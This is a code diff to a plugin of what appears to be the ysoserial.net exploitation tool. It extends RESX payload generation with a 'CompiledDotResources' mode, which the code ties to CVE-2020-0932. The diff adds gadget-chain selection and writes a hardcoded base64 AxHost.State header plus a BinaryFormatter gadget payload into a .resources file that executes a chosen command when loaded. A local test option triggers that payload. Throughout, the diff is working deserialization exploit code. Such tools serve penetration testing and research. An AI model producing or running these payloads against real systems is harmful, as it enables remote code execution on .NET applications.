@@ -3,6 +3,9 @@ using NDesk.Options;
 using System;
 using ysoserial.Generators;
 using ysoserial.Helpers;
+using System.Linq;
+using System.IO;
+using System.Resources;
 
 /**
  * Author: Soroush Dalili (@irsdl)
@@ -24,14 +27,20 @@ namespace ysoserial.Plugins
         static string mode = "";
         static string file = "";
         static string command = "";
+        static string gadget_name = "";
+        static string outputfile = "";
+        static bool test = false;
         static bool minify = false;
         static bool useSimpleType = true;
 
         static OptionSet options = new OptionSet()
             {
-                {"M|mode=", "the payload mode: indirect_resx_file, BinaryFormatter, SoapFormatter.", v => mode = v },
-                {"c|command=", "the command to be executed in BinaryFormatter. If this is provided for SoapFormatter, it will be used as a file for ActivitySurrogateSelectorFromFile", v => command = v },
+                {"M|mode=", "the payload mode: indirect_resx_file, CompiledDotResources (useful for CVE-2020-0932 for example), BinaryFormatter, SoapFormatter.", v => mode = v },
+                {"c|command=", "the command to be executed in BinaryFormatter and CompiledDotResources. If this is provided for SoapFormatter, it will be used as a file for ActivitySurrogateSelectorFromFile", v => command = v },
+                {"g|gadget=", "The gadget chain used for BinaryFormatter and CompiledDotResources (default: TextFormattingRunProperties).", v => gadget_name = v },
                 {"F|file=", "UNC file path location: this is used in indirect_resx_file mode.", v => file = v },
+                {"of|outputfile=", "a file path location for CompiledDotResources to store the .resources file (default: payload.resources)", v => outputfile = v },
+                {"t|test", "Whether to run payload locally. Default: false", v => test =  v != null },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                 {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
             };
@@ -43,7 +52,7 @@ namespace ysoserial.Plugins
 
         public string Description()
         {
-            return "Generates RESX files";
+            return "Generates RESX and .RESOURCES files";
         }
 
         public string Credit()
@@ -66,6 +75,7 @@ namespace ysoserial.Plugins
                 inputArgs.Cmd = command;
                 inputArgs.Minify = minify;
                 inputArgs.UseSimpleType = useSimpleType;
+                inputArgs.Test = test;
             }
             catch (OptionException e)
             {
@@ -75,6 +85,16 @@ namespace ysoserial.Plugins
                 System.Environment.Exit(-1);
             }
 
+            if (String.IsNullOrWhiteSpace(gadget_name))
+            {
+                gadget_name = "TextFormattingRunProperties";
+            }
+
+            if (String.IsNullOrWhiteSpace(outputfile))
+            {
+                outputfile = "payload.resources";
+            }
+
             return GetPayload(mode, file, inputArgs);
         }
 
@@ -82,7 +102,8 @@ namespace ysoserial.Plugins
         {
             return GetPayload(mode, "", inputArgs);
         }
-        public static string GetPayload(string mode, string file, InputArgs inputArgs) { 
+        public static string GetPayload(string mode, string file, InputArgs inputArgs)
+        {
             String mtype = "";
             String payloadValue = "";
             string payload = @"<root>
@@ -160,19 +181,81 @@ namespace ysoserial.Plugins
                     }
                     break;
                 case "binaryformatter":
-                    if (!String.IsNullOrEmpty(inputArgs.CmdFullString) && !String.IsNullOrWhiteSpace(inputArgs.CmdFullString))
+                case "compileddotresources":
+                    if (!String.IsNullOrWhiteSpace(inputArgs.CmdFullString))
                     {
-                        mtype = @"mimetype=""application/x-microsoft.net.object.binary.base64""";
-                        byte[] osf = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
-                        payloadValue = Convert.ToBase64String(osf);
+                        var types = AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes());
+                        var generatorTypes = types.Where(p => typeof(IGenerator).IsAssignableFrom(p) && !p.IsInterface && !p.AssemblyQualifiedName.Contains("Helpers.TestingArena"));
+                        var generators = generatorTypes.Select(x => x.Name.Replace("Generator", "")).ToList().OrderBy(s => s, StringComparer.OrdinalIgnoreCase);
+
+                        if (!generators.Contains(gadget_name, StringComparer.CurrentCultureIgnoreCase))
+                        {
+                            Console.WriteLine("Gadget not supported. Supported gadgets are: " + string.Join(" , ", generators.OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
+                            System.Environment.Exit(-1);
+                        }
+
+                        string formatter_name = "binaryformatter"; // this is what we need here
+
+                        // Instantiate Payload Generator
+                        IGenerator generator = null;
+                        try
+                        {
+                            gadget_name = generators.Where(p => String.Equals(p, gadget_name, StringComparison.OrdinalIgnoreCase)).FirstOrDefault();
+                            var container = Activator.CreateInstance(null, "ysoserial.Generators." + gadget_name + "Generator");
+                            generator = (IGenerator)container.Unwrap();
+                        }
+                        catch
+                        {
+                            Console.WriteLine("Gadget not supported!");
+                            System.Environment.Exit(-1);
+                        }
+
+                        // Check Generator supports specified formatter
+                        if (generator.IsSupported(formatter_name))
+                        {
+
+                            byte[] bfPayload = (byte[])generator.GenerateWithInit(formatter_name, inputArgs);
+
+                            if (mode.ToLower() == "binaryformatter")
+                            {
+                                mtype = @"mimetype=""application/x-microsoft.net.object.binary.base64""";
+                                
+                                payloadValue = Convert.ToBase64String(bfPayload);
+                            }
+                            else
+                            {
+                                string header_AxHostStateGadget = @"zsrvvgEAAACRAAAAbFN5c3RlbS5SZXNvdXJjZXMuUmVzb3VyY2VSZWFkZXIsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSNTeXN0ZW0uUmVzb3VyY2VzLlJ1bnRpbWVSZXNvdXJjZVNldAIAAAABAAAAAQAAAHpTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUsIFN5c3RlbS5XaW5kb3dzLkZvcm1zLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OVBBRFCCIAusAAAAAIsBAABSQQBjAHQAaQB2AGkAdAB5AFMAdQByAHIAbwBnAGEAdABlAFMAZQBsAGUAYwB0AG8AcgBGAHIAbwBtAEYAaQBsAGUAXwBQAGEAeQBsAG8AYQBkAAAAAABA";
+
+
+                                using (BinaryWriter binWriter = new BinaryWriter(File.Open(outputfile, FileMode.Create)))
+                                {
+                                    // Write header of the resources file 
+                                    binWriter.Write(Convert.FromBase64String(header_AxHostStateGadget));
+                                    // Write body of the resources file (we call it body here but not a body in practice)
+                                    binWriter.Write(bfPayload);
+                                }
+
+                                payloadValue = "The Resources output file has been written: " + outputfile;
+                                payload = "The Resources output file has been written: " + outputfile;
+                            }
+                            
+                        }
+                        else
+                        {
+                            Console.WriteLine("Formatter not supported. Supported formatters are: " + string.Join(" , ", generator.SupportedFormatters().OrderBy(s => s, StringComparer.OrdinalIgnoreCase)));
+                            System.Environment.Exit(-1);
+                        }
+
+
+                        
 
                     }
                     break;
                 case "soapformatter":
-                    mtype = @"mimetype=""application/x-microsoft.net.object.soap.base64""";
-                    if (!String.IsNullOrEmpty(inputArgs.CmdFullString) && !String.IsNullOrWhiteSpace(inputArgs.CmdFullString))
+                    mtype = @"mimetype=""text/microsoft-urt/soap-serialized/base64""";
+                    if (!String.IsNullOrWhiteSpace(inputArgs.CmdFullString))
                     {
-                        byte[] osf = (byte[])new ActivitySurrogateSelectorFromFileGenerator().GenerateWithNoTest("SoapFormatter", inputArgs);
+                        byte[] osf = (byte[]) new ActivitySurrogateSelectorFromFileGenerator().GenerateWithNoTest("SoapFormatter", inputArgs);
                         payloadValue = Convert.ToBase64String(osf);
                     }
                     else
@@ -191,13 +274,37 @@ namespace ysoserial.Plugins
                 System.Environment.Exit(-1);
             }
 
-            payload = String.Format(payload, mtype, payloadValue);
-
-            if (inputArgs.Minify)
+            if (mode.ToLower() != "compileddotresources")
             {
-                payload = XMLMinifier.Minify(payload, null, null);
+                payload = String.Format(payload, mtype, payloadValue);
+
+                if (inputArgs.Minify)
+                {
+                    payload = XMLMinifier.Minify(payload, null, null);
+                }
             }
 
+            if (inputArgs.Test)
+            {
+                try
+                {
+                    if (mode.ToLower() != "compileddotresources")
+                    {
+                        using (TextReader sr = new StringReader(payload))
+                        {
+                            var foo = new ResXResourceReader(sr);
+                            if (mode.ToLower() != "binaryformatter")
+                                foo.GetEnumerator();
+                        }
+                    }
+                    else
+                    {
+                        ResourceSet myResourceSet = new ResourceSet(outputfile);
+                    }
+                }
+                catch { }
+            }
+            
             return payload;
         }
     }
